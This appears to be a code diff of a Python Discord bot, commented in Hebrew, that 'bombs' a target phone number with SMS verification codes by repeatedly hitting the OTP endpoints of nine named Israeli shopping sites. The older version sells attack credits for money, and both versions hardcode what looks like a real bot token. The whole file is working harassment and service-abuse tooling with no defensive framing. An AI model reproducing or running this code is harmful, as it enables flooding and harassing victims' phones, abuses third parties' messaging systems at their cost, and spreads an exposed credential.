@@ -3,126 +3,79 @@ from discord.ext import commands
 import requests
 import time
 import uuid
+import os
 from flask import Flask
 from threading import Thread
-from datetime import datetime
 
-# --- שרת Flask Uptime ---
+# --- שרת Flask לשמירה על הבוט בחיים ב-Render ---
 app = Flask('')
 @app.route('/')
-def home(): return "<h1>💎 Turbo Bomber Premium Edition Online</h1>"
+def home(): return "<h1>Discord Turbo Bot Online</h1>"
 
 def keep_alive():
     t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
     t.start()
 
-# --- הגדרות בוט ---
-TOKEN = 'MTQ5MzEzMTA0MDM1NTUxNjUyOA.G3v7ZJ.SMKVMJvN3ivXnxFYViTMzDWTj2Cyfm7NPwVprc'
-ADMIN_ID = 7265913946  # ה-ID שלך בדיסקורד
+# --- הגדרות בוט דיסקורד ---
+TOKEN = 'MTQ5MzEzMTA0MDM1NTUxNjUyOA.G3v7ZJ.SMKVMJvN3ivXnxFYViTMzDWTj2Cyfm7NPwVprc' 
+ADMIN_ID = 1281295891579408418  # ה-ID שלך
 intents = discord.Intents.default()
-intents.message_content = True 
-bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
+intents.message_content = True
+bot = commands.Bot(command_prefix='!', intents=intents)
 
-# מאגר נתונים זמני (בשרת חי מומלץ להשתמש ב-JSON או DB)
-user_db = {}
-
-def get_user_data(user_id):
-    if user_id not in user_db:
-        user_db[user_id] = {'credits': 10} # 10 קרדיטים מתנה למצטרפים חדשים
-    return user_db[user_id]
-
-# --- פונקציית התקפה (9 אתרים) ---
-def run_attack(target):
+# --- פונקציית התקיפה (טורבו עם כל האתרים) ---
+def send_spam(target):
     apis = [
-        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"phone": target}, "type": "form"},
-        {"n": "Atmos 6", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 6, "source": "web"}, "type": "json"},
-        {"n": "Atmos 18", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json"},
-        {"n": "Atmos 2", "u": "https://api-ns.atmos.co.il/rest/2/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 2, "source": "web"}, "type": "json"},
-        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json"},
-        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json"},
-        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json"},
-        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json"},
-        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"}
+        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target}, "type": "form", "ref": "https://www.ace.co.il/"},
+        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
+        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
+        {"n": "Atmos General", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 6, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"},
+        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://footlocker.co.il/"},
+        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://fox.co.il/"},
+        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
+        {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
+        {"n": "Machsanei Hashmal", "u": "https://api-ns.atmos.co.il/rest/2/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 2, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"}
     ]
-    success = 0
+    
+    success_count = 0
     for site in apis:
         try:
-            h = {"User-Agent": "Mozilla/5.0"}
+            h = {"User-Agent": "Mozilla/5.0", "Referer": site["ref"]}
             if site["type"] == "json":
-                res = requests.post(site["u"], json=site["d"], headers=h, timeout=0.6)
+                res = requests.post(site["u"], json=site["d"], headers=h, timeout=0.8)
             else:
-                res = requests.post(site["u"], data=site["d"], headers=h, timeout=0.6)
-            if res.status_code in [200, 201, 204]: success += 1
-        except: pass
-    return success
+                res = requests.post(site["u"], data=site["d"], headers=h, timeout=0.8)
+            if res.status_code in [200, 201, 204]: 
+                success_count += 1
+        except: 
+            pass
+    return success_count
 
 # --- פקודות ---
 
 @bot.event
 async def on_ready():
-    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="!help | Tzur Services"))
-    print(f'💎 Premium Bomber is Live as {bot.user}')
+    print(f'✅ Logged in as {bot.user.name}')
 
 @bot.command()
-async def help(ctx):
-    embed = discord.Embed(title="💎 Turbo Bomber Premium", description="ברוכים הבאים למערכת ההפצצה המתקדמת של צור", color=0x00ffff)
-    embed.add_field(name="🚀 פקודות תקיפה", value="`!attack [Phone] [Rounds]` - מינימום דיליי", inline=False)
-    embed.add_field(name="👤 פקודות משתמש", value="`!me` - בדיקת יתרת קרדיטים\n`!buy` - מידע על רכישה", inline=True)
-    embed.add_field(name="👑 פקודות ניהול", value="`!add [User_ID] [Amount]` - להוספת קרדיטים", inline=True)
-    embed.set_footer(text="Developed by Tzur | v3.0")
-    await ctx.send(embed=embed)
-
-@bot.command()
-async def me(ctx):
-    data = get_user_data(ctx.author.id)
-    embed = discord.Embed(title="👤 פרופיל משתמש", color=0x2ecc71)
-    embed.add_field(name="שם", value=ctx.author.name)
-    embed.add_field(name="יתרת קרדיטים", value=f"💎 {data['credits']}")
-    await ctx.send(embed=embed)
-
-@bot.command()
-async def buy(ctx):
-    embed = discord.Embed(title="🛒 רכישת קרדיטים", description="רוצה להפציץ ללא הגבלה? צור קשר עם המנהל!", color=0xf1c40f)
-    embed.add_field(name="💳 מחירים", value="100 קרדיטים - 10₪\n500 קרדיטים - 40₪\n**ללא הגבלה שבועי - 70₪**", inline=False)
-    embed.add_field(name="📞 ליצירת קשר", value="<@7265913946> או בפרטי", inline=False)
-    await ctx.send(embed=embed)
-
-@bot.command()
-async def add(ctx, user_id: int, amount: int):
+async def attack(ctx, phone: str, rounds: int = 1):
+    # בדיקת אדמין
     if ctx.author.id != ADMIN_ID:
-        return await ctx.send("❌ אין לך הרשאה להשתמש בפקודה זו.")
-    data = get_user_data(user_id)
-    data['credits'] += amount
-    await ctx.send(f"✅ נוספו {amount} קרדיטים למשתמש <@{user_id}>. יתרה חדשה: {data['credits']}")
+        await ctx.send("❌ You are not authorized!")
+        return
 
-@bot.command()
-async def attack(ctx, phone: str, rounds: int):
-    user = get_user_data(ctx.author.id)
+    # הודעת התחלה
+    status_msg = await ctx.send(f"⚡ Starting Turbo Attack on {phone}...")
     
-    if user['credits'] < rounds:
-        return await ctx.send(f"❌ אין לך מספיק קרדיטים! חסרים לך {rounds - user['credits']} קרדיטים. שלח `!buy` לפרטים.")
-
-    if rounds > 50:
-        return await ctx.send("❌ מקסימום 50 סבבים למתקפה אחת (כדי למנוע חסימות).")
-
-    user['credits'] -= rounds
-    embed = discord.Embed(title="🔥 מתקפת טורבו יוצאת לדרך!", color=0xff0000)
-    embed.add_field(name="מטרה", value=phone, inline=True)
-    embed.add_field(name="סבבים", value=rounds, inline=True)
-    embed.set_thumbnail(url="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJmZzRyeGZ6ZzRyeGZ6ZzRyeGZ6ZzRyeGZ6ZzRyeGZ6ZzRyeGZ6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/H7kbTCat3fH9K/giphy.gif")
-    status_msg = await ctx.send(embed=embed)
-
     for r in range(rounds):
-        sc = run_attack(phone)
-        update = discord.Embed(title="🚀 Bombs Away...", color=0xe74c3c)
-        update.add_field(name="התקדמות", value=f"סבב {r+1} מתוך {rounds}")
-        update.add_field(name="סטטוס", value=f"נשלחו הודעות מ-{sc} אתרים")
-        await status_msg.edit(embed=update)
-        time.sleep(0.01)
-
-    final = discord.Embed(title="🏁 המשימה הושלמה!", description=f"המספר {phone} הופצץ בהצלחה.", color=0x9b59b6)
-    final.add_field(name="יתרת קרדיטים חדשה", value=f"💎 {user['credits']}")
-    await ctx.send(embed=final)
+        success = send_spam(phone)
+        # עדכון ההודעה הקיימת כדי לא להספים את הערוץ
+        await status_msg.edit(content=f"🚀 Round {r+1}/{rounds} | Success: {success}/9")
+        
+        if r < rounds - 1:
+            time.sleep(0.01) # דיליי טורבו מינימלי
+    
+    await ctx.send(f"🏁 Done! Finished {rounds} rounds on {phone}.")
 
 if __name__ == "__main__":
     keep_alive()
